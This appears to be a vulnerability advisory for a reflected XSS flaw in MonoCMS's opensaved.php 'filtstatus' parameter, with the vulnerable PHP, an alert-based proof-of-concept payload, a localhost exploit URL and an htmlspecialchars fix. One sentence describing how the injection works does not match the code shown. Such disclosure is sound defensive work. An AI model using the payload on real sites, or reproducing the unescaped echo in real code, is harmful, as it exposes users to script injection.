# [XSS vulnerability] found in MonoCMS 23-20240528 - (/monofiles/opensaved.php)


Affected Project: **MonoCMS**

Web: Php

Vendor: MonoCMS

Official Website: (https://monocms.com/)

Version: 23-20240528

Updated: 28 May, 2024

Related Code file: /monofiles/opensaved.php

Injection parameter: `filtstatus`

<br />

Sha1: 9532cda20cf7fa456d6f00ce0fe194767913ba83

<br />

## Vulnerability Description:
The issue arises because the `filtstatus` parameter from the URL is being directly inserted into the value attribute of an HTML input element without proper sanitization. 
This allows an attacker to inject arbitrary HTML or JavaScript code leading to an XSS attack.

<br />

## Vulnerable code:
```
if (isset($_GET['filtstatus']))
    echo '<option value="#">'. $_GET['filtstatus'].'</option>'.PHP_EOL.'<option value="opensaved.php'.$slink.'">All</option>';
```

<br />

## Injection Payload Tested:

We set `filtstatus` to:
```
</option><script>alert('XSS');</script><option>
```

<br />

## URL-encoded, this becomes:
```
%3C%2Foption%3E%3Cscript%3Ealert('XSS');%3C%2Fscript%3E%3Coption%3E
```

<br />

## Resulting HTML After Injection:
```
<option value="#"></option><script>alert('XSS');</script><option></option>
```


The injected `"></script>` closes the value attribute and the input tag, allowing the <script> tag to be inserted into the DOM.

<br />

## Execution:

When the browser parses this HTML, it executes the `</option><script>alert('XSS');</script><option>` code, resulting in a popup displaying `"XSS"`.

<br />

## Demonstration:

Below is how `/monofiles/opensaved.php` looks like:

<br />

![opensaved.php](https://i.postimg.cc/XNBmMxsN/1.png)

<br />

Then we can add our payload `</option><script>alert('XSS');</script><option>` :
```
http://localhost:8080/monofiles/opensaved.php?filtstatus=</option><script>alert('XSS');</script><option>
```

<br />

![payload](https://i.postimg.cc/7Yvcq7R3/2.png)

<br />

After submitting the url with the vulnerable parameter `filtstatus` and the XSS payload `</option><script>alert('XSS');</script><option>`, XSS is triggered:

<br />

![xss](https://i.postimg.cc/g2gNL6gB/3.png)

<br />

## Recommendation for Preventing XSS:

To fix this vulnerability, we must always sanitize user inputs before rendering them in the HTML. We can use functions like htmlspecialchars() in PHP to encode special characters.

<br />

Example:
```
if (isset($_GET['filtstatus']))
    echo '<option value="#">' . htmlspecialchars($_GET['filtstatus'], ENT_QUOTES, 'UTF-8') . '</option>' . PHP_EOL . '<option value="opensaved.php' . $clink . '">All</option>';
```

<br />

> One Click Can Change Everything: Be Secure.
